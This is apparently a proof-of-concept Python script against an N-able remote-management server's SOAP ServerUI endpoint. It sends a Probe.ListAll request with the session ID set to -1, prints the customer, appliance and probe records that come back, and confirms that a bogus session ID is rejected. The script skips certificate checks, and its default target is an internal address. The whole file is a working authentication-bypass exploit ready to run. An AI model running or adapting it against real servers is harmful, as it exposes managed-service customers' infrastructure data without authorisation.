#!/usr/bin/env python3
import argparse
import xml.etree.ElementTree as ET

import requests
import urllib3


def body(session_id, customer_id):
    return f'''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:m="http://www.n-able.com/mickey">
 <soap:Body><m:Probe.ListAll soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SessionID xsi:type="xsd:int">{session_id}</SessionID>
  <CustomerID xsi:type="xsd:int">{customer_id}</CustomerID>
  <DeviceIDs xsi:type="m:ArrayOf_xsd_int" soapenc:arrayType="xsd:int[0]"/>
  <ProbeTypeLike xsi:type="xsd:string"></ProbeTypeLike>
  <OrderBy xsi:type="xsd:string" xsi:nil="true"/>
  <ReverseOrder xsi:type="xsd:boolean">false</ReverseOrder>
 </m:Probe.ListAll></soap:Body>
</soap:Envelope>'''


def send(url, session_id, customer_id):
    return requests.post(
        url,
        data=body(session_id, customer_id),
        headers={"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": '""'},
        verify=False,
        timeout=30,
    )


def parse(data):
    rows = []
    for node in ET.fromstring(data).iter():
        if node.tag.rsplit("}", 1)[-1] != "ProbeArray":
            continue
        row = {child.tag.rsplit("}", 1)[-1]: child.text or "" for child in node}
        if "ApplianceID" in row:
            rows.append(row)
    return rows


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://192.168.1.14")
    parser.add_argument("--customer-id", type=int, default=50)
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    url = args.target.rstrip("/") + "/dms/services/ServerUI"
    response = send(url, -1, args.customer_id)
    response.raise_for_status()
    rows = parse(response.content)
    for row in rows:
        print(f"customer={row.get('CustomerID')} appliance={row.get('ApplianceID')} "
              f"type={row.get('ProbeType')} name={row.get('ProbeName')}")
    control = send(url, 2147483646, args.customer_id)
    print(f"invalid_session_http={control.status_code}")
    return 0 if rows and control.status_code >= 400 else 1


if __name__ == "__main__":
    raise SystemExit(main())
